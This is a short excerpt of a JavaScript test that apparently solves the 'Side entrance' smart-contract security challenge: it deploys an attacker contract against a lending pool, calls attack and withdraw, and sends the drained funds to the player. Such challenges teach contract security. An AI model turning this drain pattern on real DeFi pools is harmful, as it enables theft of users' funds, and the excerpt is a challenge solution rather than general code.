...
describe("[Challenge] Side entrance", function () {
  ...
  it("Execution", async function () {
    ...
    attackerContract = await ethers.getContractFactory("SideEntranceAttacker");
    attacker = await attackerContract.deploy(pool.address);
    await attacker.attack();
    await attacker.withdraw();
    await attacker.transferToPlayer(player.address);
  });
